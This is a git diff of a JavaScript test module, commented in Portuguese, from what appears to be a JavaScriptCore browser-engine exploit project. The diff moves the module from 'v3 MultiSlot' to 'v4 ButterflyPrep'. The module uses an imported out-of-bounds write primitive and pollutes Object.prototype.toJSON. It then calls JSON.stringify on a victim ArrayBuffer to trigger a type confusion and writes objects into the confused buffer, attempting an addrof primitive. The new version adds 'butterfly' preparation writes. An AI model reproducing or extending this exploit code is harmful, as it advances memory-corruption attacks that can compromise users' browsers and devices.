@@ -1,27 +1,27 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Modificado para testar múltiplos slots)
+// js/script3/testArrayBufferVictimCrash.mjs (v4 - Butterfly Prep)
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    oob_array_buffer_real, // Importado mas não usado diretamente aqui, triggerOOB gerencia
+    oob_array_buffer_real,
     oob_write_absolute,
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v3_MultiSlot";
+export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v4_ButterflyPrep";
 
 const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
-const VICTIM_AB_SIZE = 64; // Suficiente para float64_view_on_victim[0] e [1]
+const VICTIM_AB_SIZE = 256; // Aumentado para dar mais espaço
 
 let toJSON_call_details_v28 = null;
-let object_to_leak_A = null; // Para this[0]
-let object_to_leak_B = null; // Para this[1]
+let object_to_leak_A = null;
+let object_to_leak_B = null;
 
-// Sonda para escrever em múltiplos slots
-function toJSON_V28_Probe_MultiSlot() {
+// Sonda com tentativa de preparação do butterfly
+function toJSON_V28_Probe_ButterflyPrep() {
     toJSON_call_details_v28 = {
-        probe_variant: "V28_Probe_MultiSlot",
+        probe_variant: "V28_Probe_ButterflyPrep",
         this_type_in_toJSON: "N/A_before_call",
         error_in_toJSON: null,
         probe_called: false
@@ -33,19 +33,26 @@ function toJSON_V28_Probe_MultiSlot() {
         logS3(`[${toJSON_call_details_v28.probe_variant}] 'this' é o objeto vítima. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "leak");
 
         if (this === victim_ab_ref_for_original_test && toJSON_call_details_v28.this_type_in_toJSON === '[object Object]') {
-            logS3(`[${toJSON_call_details_v28.probe_variant}] HEISENBUG CONFIRMADA! Tentando escrever object_to_leak_A em this[0] e object_to_leak_B em this[1]...`, "vuln");
+            logS3(`[${toJSON_call_details_v28.probe_variant}] HEISENBUG CONFIRMADA! Preparando butterfly e tentando escritas...`, "vuln");
+
+            try {
+                // Tentativa de forçar alocação/expansão do butterfly
+                this[10] = 0.5; // Escrever em um índice um pouco mais alto
+                this[11] = 1.5;
+                logS3(`[${toJSON_call_details_v28.probe_variant}] Butterfly prep writes (this[10], this[11]) realizadas.`, "info");
+            } catch (e_prep) {
+                logS3(`[${toJSON_call_details_v28.probe_variant}] Erro durante butterfly prep: ${e_prep.message}`, "warn");
+            }
+
             if (object_to_leak_A) {
                 this[0] = object_to_leak_A;
                 logS3(`[${toJSON_call_details_v28.probe_variant}] Escrita de object_to_leak_A em this[0] (supostamente) realizada.`, "info");
-            } else {
-                logS3(`[${toJSON_call_details_v28.probe_variant}] object_to_leak_A é null. Escrita em this[0] não tentada.`, "warn");
             }
             if (object_to_leak_B) {
                 this[1] = object_to_leak_B;
                 logS3(`[${toJSON_call_details_v28.probe_variant}] Escrita de object_to_leak_B em this[1] (supostamente) realizada.`, "info");
-            } else {
-                logS3(`[${toJSON_call_details_v28.probe_variant}] object_to_leak_B é null. Escrita em this[1] não tentada.`, "warn");
             }
+
         } else if (this === victim_ab_ref_for_original_test) {
             logS3(`[${toJSON_call_details_v28.probe_variant}] Heisenbug NÃO confirmada. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "warn");
         }
@@ -61,13 +68,13 @@ let victim_ab_ref_for_original_test = null;
 
 export async function executeArrayBufferVictimCrashTest() {
     const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug e Tentativa de Addrof Multi-Slot ---`, "test", FNAME_CURRENT_TEST);
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug e Tentativa de Addrof com Prep de Butterfly ---`, "test", FNAME_CURRENT_TEST);
     document.title = `${FNAME_MODULE_V28} Inic...`;
 
     toJSON_call_details_v28 = null;
     victim_ab_ref_for_original_test = null;
-    object_to_leak_A = { marker: "ObjetoA_ParaLeituraEmVIEW0", id: Date.now() };
-    object_to_leak_B = { marker: "ObjetoB_ParaLeituraEmVIEW1", id: Date.now() + 123 }; // Objeto distinguível
+    object_to_leak_A = { marker: "ObjA_v4", id: Date.now() };
+    object_to_leak_B = { marker: "ObjB_v4", id: Date.now() + 234 };
 
     let errorCapturedMain = null;
     let stringifyOutput = null;
@@ -92,11 +99,11 @@ export async function executeArrayBufferVictimCrashTest() {
         
         await PAUSE_S3(100); 
 
-        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
+        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE); // VICTIM_AB_SIZE agora é 256
         let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
         float64_view_on_victim.fill(fillPattern);
 
-        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_V28_Probe_MultiSlot.name}...`, "test", FNAME_CURRENT_TEST);
+        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_V28_Probe_ButterflyPrep.name}...`, "test", FNAME_CURRENT_TEST);
         
         const ppKey = 'toJSON';
         let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
@@ -104,13 +111,13 @@ export async function executeArrayBufferVictimCrashTest() {
 
         try {
             Object.defineProperty(Object.prototype, ppKey, {
-                value: toJSON_V28_Probe_MultiSlot,
+                value: toJSON_V28_Probe_ButterflyPrep,
                 writable: true, configurable: true, enumerable: false
             });
             pollutionApplied = true;
-            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_Probe_MultiSlot.name}.`, "info", FNAME_CURRENT_TEST);
+            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_Probe_ButterflyPrep.name}.`, "info", FNAME_CURRENT_TEST);
 
-            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)... (Ponto esperado da Heisenbug e escritas em this[0], this[1])`, "warn", FNAME_CURRENT_TEST);
+            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
             stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
             
             logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Resultado (da sonda): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
@@ -205,10 +212,10 @@ export async function executeArrayBufferVictimCrashTest() {
     }
     return { 
         errorOccurred: errorCapturedMain, 
-        potentiallyCrashed: false, // Se chegamos aqui, não crashou silenciosamente.
+        potentiallyCrashed: false,
         stringifyResult: stringifyOutput, 
         toJSON_details: toJSON_call_details_v28,
-        addrof_A_attempt_result: addrof_result_A, // Retornar ambos os resultados
+        addrof_A_attempt_result: addrof_result_A,
         addrof_B_attempt_result: addrof_result_B
     };
 }
